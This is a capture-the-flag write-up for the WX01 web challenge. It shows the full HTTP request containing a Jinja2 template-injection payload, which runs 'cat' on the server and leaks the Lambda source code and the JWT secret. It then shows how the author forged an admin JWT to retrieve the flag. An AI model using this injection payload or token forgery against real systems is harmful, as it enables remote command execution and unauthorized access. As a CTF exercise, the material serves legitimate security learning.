# WX01
## BRIEFING
Access the url at: https://cfta-wx01.allyourbases.co and find a way to login to the admin portal to get the flag.

Note: You have been provided with the following credentials to help you:

username: `tim`

password: `berners-lee`

## Solution

I did not figure this one out during the competition. I was familiar with JWT tokens but the part that eluded me was determining the JWT key. Trying to brute force it did not work and I later found out why.

We had to extract the key through an SSTI injection via the `Help` box on the main page of the site. If we entered the following inject into the `email` field we could pull the key:

```console
POST /stag/wx01 HTTP/1.1
Host: 6feducn4d2.execute-api.eu-west-1.amazonaws.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 120
Origin: https://cfta-wx01.allyourbases.co
Connection: close
Referer: https://cfta-wx01.allyourbases.co/

{
  "action":"help",
  "email":"{{globals().__builtins__.__import__('os').popen('cat /var/task/lambda_function.py').read()}}"
}
```

This yielded:

```console
{"statusCode": 200, "body": "\n    <p>Your request has been submitted.</p>\n    <p>You will receive an email at: from jinja2 import Template\nimport json\nimport urllib\nimport jwt\nimport os\n\n# JWT Key\nkey = \"aversion-chute-freeway-corporal\"\nalgo = \"HS256\"\n\ndef getHelp(event):\n    email = ''.join(event['email'])\n    template = \"\"\"\n    <p>Your request has been submitted.</p>\n    <p>You will receive an email at: %s</p>\n    <p>This might take a reaaaaaaally long time though (forever).</p>\n    \"\"\" % (urllib.parse.unquote(email).replace(\"<\", \"&lt;\").replace(\">\", \"&gt;\"))\n    msg = Template(template).render(dir=dir, help=help, locals=locals, globals=globals, open=open)\n    msg = msg[:-len(msg)+700]\n    return msg\n\ndef login(event)"}
```

After getting the key (`aversion-chute-freeway-corporal`), we had to spoof the JWT token produced when logging in via the provided credentials of `tim` and `berners-lee`:

```console
{"action":"verify","token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRpbSIsInJvbGUiOiJ1c2VyIn0.j8wX114OSLEo2I4S6GQ4wQ4ZszXtyp0wFc0lpwc1yRQ"}
```

Initally we get:

```console
{"statusCode": 200, "body": "Insufficient Privileges"}
```

After spoofing via [jwt.io](jwt.io) (and chaning the `role` field to `admin` we get a new token:

```console
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRpbSIsInJvbGUiOiJhZG1pbiJ9.S9-09o2b55F1WD2Fgyam6R-aL_CM93EaetWVIDB9-ks
```

Sending it yields:
```console
{"statusCode": 200, "body": "muLtiStagingIT710-12"}
```

The flag is **muLtiStagingIT710-12**.



